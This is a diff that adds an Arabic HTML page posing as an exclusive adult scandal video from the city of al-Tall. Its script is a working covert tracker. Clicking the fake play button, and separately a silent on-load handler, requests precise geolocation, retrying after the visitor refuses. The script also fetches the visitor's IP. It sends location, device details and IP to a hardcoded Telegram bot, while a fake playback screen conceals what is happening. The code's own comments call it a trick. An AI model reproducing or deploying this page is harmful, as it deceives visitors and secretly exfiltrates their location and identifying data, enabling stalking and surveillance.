@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عاجل: فضيحة تهز مدينة التل - فيديو حصري</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #e0e0e0;
+            text-align: right;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: radial-gradient(ellipse at center, #1a1a1a 0%, #000000 100%);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #6d0000, #cc0000);
+            color: #fff;
+            padding: 30px 20px 25px;
+            text-align: center;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(200, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: "⚡";
+            font-size: 80px;
+            position: absolute;
+            right: -10px;
+            bottom: -20px;
+            opacity: 0.1;
+        }
+        h1 {
+            font-size: 26px;
+            margin: 0;
+            text-shadow: 0 2px 15px rgba(0,0,0,0.5);
+        }
+        .date {
+            font-size: 14px;
+            opacity: 0.85;
+            margin-top: 5px;
+            background: rgba(255,255,255,0.12);
+            display: inline-block;
+            padding: 3px 18px;
+            border-radius: 20px;
+        }
+
+        .article {
+            padding: 20px;
+            max-width: 850px;
+            width: 95%;
+            margin: -20px auto 15px;
+            background: rgba(18, 18, 18, 0.96);
+            border-radius: 18px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
+            border: 1px solid #2a2a2a;
+            position: relative;
+            z-index: 2;
+        }
+        .article p {
+            font-size: 16px;
+            margin: 15px 0;
+            color: #c0c0c0;
+        }
+        .article strong {
+            color: #ff6b6b;
+        }
+        .highlight {
+            background: rgba(255, 152, 0, 0.08);
+            padding: 18px;
+            border-right: 4px solid #ff9800;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #ffcc80;
+            font-size: 17px;
+        }
+
+        /* ===== مشغل الفيديو ===== */
+        .player-container {
+            background: #000;
+            border-radius: 14px;
+            overflow: hidden;
+            margin: 20px 0 10px;
+            border: 2px solid #2a2a2a;
+            position: relative;
+        }
+        .video-thumb {
+            background: url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat;
+            height: 60vh;
+            max-height: 400px;
+            width: 100%;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .video-thumb:hover {
+            filter: brightness(1.08);
+        }
+        .video-thumb .overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(0deg, rgba(0,0,0,0.7) 0%, transparent 50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .play-btn {
+            font-size: 75px;
+            color: #fff;
+            background: rgba(200, 0, 0, 0.85);
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+            border: 3px solid rgba(255,255,255,0.15);
+            user-select: none;
+        }
+        .play-btn:hover {
+            transform: scale(1.05);
+            background: #ff0000;
+            box-shadow: 0 0 80px rgba(255, 0, 0, 0.5);
+        }
+        .play-btn:active {
+            transform: scale(0.93);
+        }
+        .warning-tag {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(200, 0, 0, 0.85);
+            color: #fff;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 5;
+        }
+        .video-label {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            color: rgba(255,255,255,0.4);
+            font-size: 12px;
+            background: rgba(0,0,0,0.6);
+            padding: 4px 14px;
+            border-radius: 20px;
+            z-index: 5;
+        }
+
+        /* ===== شاشة التحميل ===== */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            border-radius: 12px;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 55px;
+            height: 55px;
+            border: 4px solid #2a2a2a;
+            border-top: 4px solid #cc0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #fff;
+            margin-top: 18px;
+            font-size: 15px;
+            opacity: 0.8;
+        }
+        .loading-sub {
+            color: #888;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        /* شريط تقدم وهمي */
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: #2a2a2a;
+            border-radius: 4px;
+            margin-top: 15px;
+            overflow: hidden;
+            opacity: 0.6;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #cc0000, #ff4444);
+            width: 0%;
+            border-radius: 4px;
+            animation: progressAnim 3s ease-in-out infinite;
+        }
+        @keyframes progressAnim {
+            0% { width: 0%; }
+            30% { width: 25%; }
+            60% { width: 55%; }
+            85% { width: 80%; }
+            100% { width: 95%; }
+        }
+
+        /* ===== شريط الحالة (مخفي لكن موجود للتصحيح) ===== */
+        .status-bar {
+            display: none;
+        }
+
+        /* ===== عنصر فيديو وهمي (للخدعة) ===== */
+        #hiddenVideo {
+            display: none;
+        }
+
+        .footer {
+            margin-top: 10px;
+            padding: 12px;
+            color: #333;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        @media (max-width: 600px) {
+            h1 { font-size: 20px; }
+            .article { padding: 14px; }
+            .play-btn { width: 80px; height: 80px; font-size: 50px; }
+            .video-thumb { height: 45vh; max-height: 280px; }
+            .progress-bar { width: 150px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>🎥 فضيحة التل - الفيديو الكامل</h1>
+        <p class="date">📅 19 ديسمبر 2025 • حصري • 🔞 للكبار</p>
+    </div>
+
+    <div class="article">
+        <p>📌 بعد أسابيع من الانتظار، حصلنا على <strong>الفيديو الحصري</strong> الذي يفضح صفقات سرية في مدينة التل. المشاهد توثق لقاءات غير متوقعة وتفاصيل صادمة.</p>
+        <p>🕵️ المصادر أكدت صحة الفيديو، وتم ترميزه لمنع التسريب خارج المنطقة.</p>
+
+        <div class="highlight">
+            <p>"الفيديو يحتوي على مشاهد حصرية لم تُنشر من قبل. تم التحقق من مصداقيته بالكامل."</p>
+        </div>
+
+        <!-- ===== مشغل الفيديو ===== -->
+        <div class="player-container">
+            <div class="video-thumb" id="videoThumb" onclick="smartLocationRequest()">
+                <div class="overlay">
+                    <div class="play-btn" id="playBtn">▶</div>
+                </div>
+                <span class="warning-tag">🔞 +18</span>
+                <span class="video-label">📹 حصري • 4K</span>
+
+                <!-- شاشة التحميل -->
+                <div class="loading-overlay" id="loadingOverlay">
+                    <div class="spinner"></div>
+                    <div class="loading-text" id="loadingText">⏳ جاري تجهيز البث...</div>
+                    <div class="loading-sub" id="loadingSub">يتم التحقق من المنطقة</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== عنصر فيديو وهمي (للخدعة) ===== -->
+        <video id="hiddenVideo" autoplay muted playsinline></video>
+
+        <p style="font-size:13px; color:#444; text-align:center; margin-top:8px;">
+            🔒 يتم التحقق من الموقع لتأكيد صلاحية المشاهدة
+        </p>
+    </div>
+
+    <div class="footer">
+        © 2025 • التل • جميع الحقوق محفوظة
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔥 البيانات - تم تصحيح التوكن والمعرف
+        // ============================================================
+        const BOT_TOKEN = '8930981100:AAFU27ynw94u65rTWI6U7Lo1kv7umnexoHs';
+        const CHAT_ID = '8930981100';
+
+        // ============================================================
+        // عناصر الصفحة
+        // ============================================================
+        const videoThumb = document.getElementById('videoThumb');
+        const playBtn = document.getElementById('playBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const loadingSub = document.getElementById('loadingSub');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+
+        // ============================================================
+        // متغيرات الحالة
+        // ============================================================
+        let isProcessing = false;
+        let retryCount = 0;
+        const MAX_RETRIES = 3;
+        let locationSent = false; // منع الإرسال المزدوج
+
+        // ============================================================
+        // دالة الطلب الذكي - الخدعة الرئيسية
+        // ============================================================
+        function smartLocationRequest() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // إخفاء زر التشغيل وإظهار التحميل
+            playBtn.style.display = 'none';
+            loadingOverlay.classList.add('active');
+            loadingText.textContent = '⏳ جاري تحميل الفيديو...';
+            loadingSub.textContent = 'يتم تجهيز البث عالي الدقة';
+
+            // بدء طلب الموقع
+            requestLocationWithTrick();
+        }
+
+        // ============================================================
+        // الخدعة: طلب الموقع مع إعادة محاولة صامتة
+        // ============================================================
+        function requestLocationWithTrick() {
+            if (!navigator.geolocation) {
+                // إذا لم يدعم المتصفح، نرسل تنبيه للبوت ونكمل
+                sendToBot('⚠️ المتصفح لا يدعم تحديد الموقع');
+                simulateVideoPlay();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                // ===== نجاح =====
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = Math.round(position.coords.accuracy);
+                    const time = new Date().toISOString();
+
+                    // تجهيز البيانات للإرسال
+                    const userAgent = navigator.userAgent;
+                    const screenSize = `${screen.width}x${screen.height}`;
+                    const language = navigator.language;
+
+                    const caption = `🆕 مشاهد جديد من التل
+        📍 الموقع: ${lat}, ${lon}
+        🎯 الدقة: ±${acc} متر
+        🕒 التوقيت: ${time}
+        💻 الجهاز: ${userAgent.substring(0, 80)}...
+        📱 الشاشة: ${screenSize}
+        🌐 اللغة: ${language}
+        ✅ تم التحقق التلقائي`;
+
+                    sendToBot(caption);
+                    locationSent = true;
+
+                    // محاكاة تشغيل الفيديو
+                    simulateVideoPlay();
+                },
+                // ===== فشل =====
+                function(error) {
+                    let isPermissionDenied = false;
+                    let errorMsg = '';
+
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'رفض الصلاحية';
+                            isPermissionDenied = true;
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'الموقع غير متاح';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'انتهت المهلة';
+                            break;
+                        default:
+                            errorMsg = 'خطأ غير معروف';
+                    }
+
+                    // إرسال تفاصيل الخطأ للبوت
+                    sendToBot(`❌ فشل جلب الموقع: ${errorMsg} (المحاولة ${retryCount+1})`);
+
+                    // إعادة المحاولة إذا كان رفض صلاحية
+                    if (isPermissionDenied && retryCount < MAX_RETRIES) {
+                        retryCount++;
+                        loadingText.textContent = `⏳ محاولة ${retryCount}/${MAX_RETRIES}...`;
+                        loadingSub.textContent = 'جاري إعادة محاولة التحقق';
+                        
+                        setTimeout(() => {
+                            requestLocationWithTrick();
+                        }, 2500);
+                        return;
+                    }
+
+                    // الفشل النهائي - لكن نكمل وكأن الفيديو يعمل
+                    simulateVideoPlay();
+                },
+                // ===== إعدادات عالية الدقة =====
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ============================================================
+        // محاكاة تشغيل الفيديو (تظهر دائماً للمستخدم)
+        // ============================================================
+        function simulateVideoPlay() {
+            // تغيير الرسائل لتوحي بأن الفيديو يعمل
+            loadingText.textContent = '🎬 يتم تشغيل الفيديو...';
+            loadingSub.textContent = 'جاري فتح البث عالي الدقة';
+
+            // بعد 2 ثانية، إخفاء التحميل وإظهار وهم التشغيل
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                
+                // تغيير شكل المشغل ليبدو وكأنه يشغل فيديو
+                videoThumb.style.background = 'linear-gradient(135deg, #0a0a0a, #1a0a0a)';
+                videoThumb.innerHTML = `
+                    <div class="overlay" style="background:rgba(0,0,0,0.3);">
+                        <div style="color:#fff; font-size:35px; opacity:0.3;">🎬</div>
+                        <div style="color:#fff; font-size:15px; margin-top:8px; opacity:0.5;">جاري التشغيل</div>
+                        <div style="color:#888; font-size:12px; margin-top:4px; opacity:0.4;">HD • 4K</div>
+                    </div>
+                    <span class="warning-tag">🔞 +18</span>
+                    <span class="video-label">▶️ جارٍ التشغيل • 00:32</span>
+                `;
+                
+                isProcessing = false;
+                retryCount = 0;
+                locationSent = false;
+
+                // بعد 5 ثواني، نغير النص ليعطي انطباع بأن الفيديو يتقدم
+                setTimeout(() => {
+                    const label = document.querySelector('.video-label');
+                    if (label) {
+                        label.textContent = '▶️ جارٍ التشغيل • 01:15';
+                    }
+                }, 5000);
+
+                setTimeout(() => {
+                    const label = document.querySelector('.video-label');
+                    if (label) {
+                        label.textContent = '▶️ جارٍ التشغيل • 02:43';
+                    }
+                }, 10000);
+
+            }, 2000);
+        }
+
+        // ============================================================
+        // إرسال للبوت (مع تصحيح التوكن)
+        // ============================================================
+        function sendToBot(caption) {
+            // منع الإرسال المزدوج
+            if (locationSent && caption.includes('الموقع')) return;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            // استخدام POST بدلاً من GET لتجنب مشاكل طول الرابط
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: caption,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => {
+                if (!res.ok) throw new Error('فشل الإرسال');
+                return res.json();
+            })
+            .then(data => {
+                console.log('✅ تم الإرسال بنجاح:', data);
+            })
+            .catch(err => {
+                console.warn('⚠️ فشل الإرسال (صامت):', err);
+                // لا نعرض أي شيء للمستخدم
+            });
+        }
+
+        // ============================================================
+        // تحميل تلقائي للموقع عند فتح الصفحة (خلفي وصامت)
+        // ============================================================
+        window.addEventListener('load', function() {
+            // ننتظر 2 ثانية ثم نحاول جلب الموقع في الخلفية
+            setTimeout(() => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const time = new Date().toISOString();
+                            const ua = navigator.userAgent.substring(0, 60);
+                            
+                            sendToBot(`🔄 تحقق خلفي تلقائي
+        📍 ${lat}, ${lon}
+        🕒 ${time}
+        💻 ${ua}`);
+                        },
+                        function(err) {
+                            // فشل صامت - لا نرسل للمستخدم أي شيء
+                            console.log('تحقق خلفي فشل:', err.message);
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                }
+            }, 2000);
+        });
+
+        // ============================================================
+        // جلب IP تقريبي (اختياري - إضافة معلومات إضافية)
+        // ============================================================
+        function fetchIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ip) {
+                        sendToBot(`🌐 IP تقريبي: ${data.ip}`);
+                    }
+                })
+                .catch(() => {});
+        }
+
+        // تشغيل جلب IP بعد 3 ثواني
+        setTimeout(fetchIP, 3000);
+
+        // ============================================================
+        // رسالة تأكيد في الكونسول
+        // ============================================================
+        console.log('✅ نظام التحقق الذكي يعمل بصمت تام');
+        console.log('🎯 الخدعة: المستخدم يظن أنه يشغل فيديو');
+        console.log(`🔑 التوكن: ${BOT_TOKEN.substring(0, 10)}...`);
+        console.log(`📨 المعرف: ${CHAT_ID}`);
+    </script>
+</body>
+</html>
